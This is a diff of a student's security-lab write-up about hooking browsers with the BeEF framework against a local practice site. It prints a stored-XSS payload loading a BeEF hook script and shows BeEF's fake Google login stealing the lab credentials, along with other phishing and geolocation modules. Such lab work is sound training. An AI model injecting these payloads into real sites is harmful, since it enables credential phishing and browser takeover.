@@ -191,7 +191,7 @@ By turning off intercept and FoxyProxy the user-name and password were ran in th
 -  Lock-out after specified number of failed login attempts
 
 
-# Web Application Vulnerability Three: Where's the BeEF?
+# Web Application Vulnerability Three: Cross-Site Scripting
 
 [Click Here For Setup Instructions](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/BeEF%20setup.pdf)
 
@@ -218,34 +218,91 @@ Click the second **`"here"`** for the advanced version.  This will open the foll
 
 ![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/BeEF%20Second%20Here.png)
 
+
 This opens the page seen below which has been infected with a BeEF hook.
+
 ![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/BeEF%20Hook.png)
 
-**Once you have pulled up the infected webpage above your browser has not been `HOOKED!`
+**Once you have pulled up the infected webpage above your browser has been `HOOKED!`**
 
 Return to your control panel and on the left side you will notice your browser is infected and shows under `"Hooked Browsers"`
+
 ![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/Hooked%20Browser%20Command%20Tab.png)
 
-Click on the hooked browser **127.0.0.2** and then the **Commands** tab where you will see a list of hundreds of exploits that can be ran agaisnt the hooked browser. Note every exploit will work but many will!
+
+Click on the hooked browser **127.0.0.2** and then the **Commands** tab where you will see a list of hundreds of exploits that can be ran agaisnt the hooked browser. Note, not every exploit will work but many will!
+
 
 **First Exploit: Social Engineering**
 
--  To access this exploit select the Google Phising under Social Engineering (see below).
+-  To access this exploit select the Google Phishing under Social Engineering (see below).
+
 ![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/google%20phishing.png)
+
 
 The results are displayed on the right side of the page under `"Google Phising"` (see above).
 
+
 Click **`Execute`** on the bottom right of the screen to launch the exploit.
 
+
 -  After selecting Execute, return back to your browser that was displaying the Butcher Shop website. Note that it has been changed to a Google        login page.  A victim could easily mistake this for a real login prompt. (see below)
+
 
 ![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/Google%20Login%20Page.png)
 
 -  Use the credentials below to login into the fake Google page.
-      - Username: hackeruser
-      - Password: hackerpass
+
+      - ** Username: hackeruser**
+      - ** Password: hackerpass**
+
 
 Return to the BeEF contrl panel and in the center panel select the first option labeled **`command 1`** and you will be able to the user name and password have been captured on the right side of the screen under command results (see below).
 
 ![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/Command%20One%20Results.png)
 
+
+### Now that you know how to use the BeEF tool, you'll use it to test the Replicants web application. You are tasked with using a stored XSS attack to inject a BeEF hook into Replicants' main website.
+
+
+-  The page you will test is the Replicants Stored XSS application which was used the first day of this unit:  
+  
+      -  http://192.168.13.25/vulnerabilities/xss_s/
+
+      -  The BeEF hook, which was returned after running the sudo beef command was: http://127.0.0.1:3000/hook.js
+
+      -  The payload to inject with this BeEF hook is: <script src="http://127.0.0.1:3000/hook.js"></script>
+
+![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/Unfinished%20Script.png)
+
+A limitation was discovered while trying to inject the payload script that would not allow the full script to be typed into the message box (see above).
+
+**The work around to this limitation was to change the maxlength of the message box field in the original source code to allow the input of the whole payload code into the message box.**
+
+![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/Change%20content%20legnth%20to%20100.png)
+
+Image below shows that the code was changed and the full script is now able to fit in the message box field.
+
+![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/Cross%20Site%20Finished%20Script.png)
+
+
+### BeEF Exploits Against Replicants Webpage
+
+
+    - Social Engineering
+      - Pretty Theft
+      
+      
+![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/session%20timeout%20shot.png)
+      
+
+    - Social Engineering
+      - Fake Notification Bar
+      
+ ![TODO](
+
+
+    - Host
+      -  Get Geolocation (Third Party)
+
+![TODO](https://github.com/Tamie13/Vulnerabilities-and-Hardening-HW/blob/main/Images%20And%20Text%20Files/geolocation%203rd%20party%20shot.png)
